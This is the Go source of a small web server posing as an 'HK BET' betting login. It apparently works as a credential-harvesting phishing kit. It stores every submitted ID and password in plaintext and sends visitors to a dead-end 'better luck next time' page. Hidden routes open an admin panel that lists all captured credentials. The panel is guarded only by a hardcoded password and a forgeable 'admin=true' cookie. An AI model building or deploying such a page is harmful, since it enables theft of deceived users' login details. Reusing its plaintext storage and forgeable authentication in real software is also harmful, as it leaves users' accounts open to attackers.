package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"os"
	"regexp"

	_ "github.com/mattn/go-sqlite3"
)

var db *sql.DB

var idRegex = regexp.MustCompile(`^\d{9,10}$`)
var passRegex = regexp.MustCompile(`^[a-zA-Z0-9]+$`)

func initDB() {
	var err error
	db, err = sql.Open("sqlite3", "./data.db")
	if err != nil {
		panic(err)
	}

	_, _ = db.Exec(`
	CREATE TABLE IF NOT EXISTS users (
		id TEXT PRIMARY KEY,
		password TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		banned INTEGER DEFAULT 0
	);`)
}

// ================= HOME =================
func home(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, `
<!DOCTYPE html>
<html>
<head>
<title>HK BET</title>
</head>
<body style="background:#0a0a0a;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial">

<div style="width:380px;padding:40px;background:#111;border-radius:14px;text-align:center">
<h2 style="color:#00ff84">HK BET</h2>

<form method="POST" action="/login">
<input name="id" placeholder="ID" required style="width:100%;padding:12px;margin-top:10px;background:#000;border:1px solid #222;color:white;border-radius:10px">
<input type="text" name="password" placeholder="Password" required style="width:100%;padding:12px;margin-top:10px;background:#000;border:1px solid #222;color:white;border-radius:10px">
<button style="width:100%;padding:12px;margin-top:12px;background:linear-gradient(90deg,#00ff84,#00aaff);border:none;font-weight:bold;border-radius:10px">Login</button>
</form>

</div>

</body>
</html>
`)
}

// ================= LOGIN =================
func login(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()

	id := r.FormValue("id")
	pass := r.FormValue("password")

	if !idRegex.MatchString(id) {
		http.Error(w, "Invalid ID", 400)
		return
	}

	if !passRegex.MatchString(pass) {
		http.Error(w, "Invalid password", 400)
		return
	}

	var stored string
	var banned int

	err := db.QueryRow("SELECT password, banned FROM users WHERE id=?", id).Scan(&stored, &banned)

	if banned == 1 {
		http.Error(w, "BANNED", 403)
		return
	}

	if err == sql.ErrNoRows {
		db.Exec("INSERT INTO users(id, password) VALUES(?,?)", id, pass)
	} else if err == nil && stored != pass {
		http.Error(w, "Wrong password", 401)
		return
	}

	http.Redirect(w, r, "/code", 302)
}

// ================= CODE =================
func codePage(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, `
<!DOCTYPE html>
<html>
<body style="background:#0a0a0a;color:white;display:flex;justify-content:center;align-items:center;height:100vh">

<form method="POST" action="/verify">
<input name="code" placeholder="Enter Code">
<button>Verify</button>
</form>

</body>
</html>
`)
}

// ================= VERIFY =================
func verifyCode(w http.ResponseWriter, r *http.Request) {
	if r.FormValue("code") != "3032007" {
		http.Error(w, "Wrong code", 401)
		return
	}
	http.Redirect(w, r, "/goodbye", 302)
}

// ================= GOODBYE =================
func goodbye(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, `
<!DOCTYPE html>
<html>
<body style="background:#0a0a0a;color:white;display:flex;justify-content:center;align-items:center;height:100vh">
<h1>حظ أوفر المرة القادمة</h1>
</body>
</html>
`)
}

// ================= ADMIN LOGIN =================
func adminLogin(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, `
<!DOCTYPE html>
<html>
<body style="background:#0a0a0a;color:white;display:flex;justify-content:center;align-items:center;height:100vh">

<form method="POST" action="/7x9k-auth-hidden-92" style="background:#111;padding:30px;border-radius:12px">
<input type="password" name="password" placeholder="Admin Password">
<button>Login</button>
</form>

</body>
</html>
`)
}

// ================= ADMIN AUTH =================
func adminAuth(w http.ResponseWriter, r *http.Request) {
	if r.FormValue("password") != "ht 303 2410" {
		http.Error(w, "Wrong password", 401)
		return
	}

	http.SetCookie(w, &http.Cookie{
		Name:     "admin",
		Value:    "true",
		Path:     "/",
		HttpOnly: true,
	})

	http.Redirect(w, r, "/7x9k-dashboard-hidden-92", 302)
}

// ================= ADMIN PANEL =================
func adminPanel(w http.ResponseWriter, r *http.Request) {

	cookie, err := r.Cookie("admin")
	if err != nil || cookie.Value != "true" {
		http.Redirect(w, r, "/", 302)
		return
	}

	rows, err := db.Query("SELECT id, password, created_at, banned FROM users ORDER BY created_at DESC")
	if err != nil {
		http.Error(w, "DB Error", 500)
		return
	}
	defer rows.Close()

	fmt.Fprint(w, `
<!DOCTYPE html>
<html>
<body style="background:#0a0a0a;color:white;font-family:Arial">

<h2>Users Panel</h2>

<table border="1" style="width:100%">
<tr><th>ID</th><th>Password</th><th>Time</th><th>Status</th></tr>
`)

	for rows.Next() {
		var id, pass, time string
		var banned int

		rows.Scan(&id, &pass, &time, &banned)

		status := "Active"
		if banned == 1 {
			status = "Banned"
		}

		fmt.Fprintf(w, "<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>", id, pass, time, status)
	}

	fmt.Fprint(w, `
</table>

</body>
</html>
`)
}

// ================= MAIN =================
func main() {
	initDB()
	defer db.Close()

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	http.HandleFunc("/", home)
	http.HandleFunc("/login", login)
	http.HandleFunc("/code", codePage)
	http.HandleFunc("/verify", verifyCode)
	http.HandleFunc("/goodbye", goodbye)

	http.HandleFunc("/7x9k-panel-hidden-92", adminLogin)
	http.HandleFunc("/7x9k-auth-hidden-92", adminAuth)
	http.HandleFunc("/7x9k-dashboard-hidden-92", adminPanel)

	fmt.Println("Server running on :" + port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}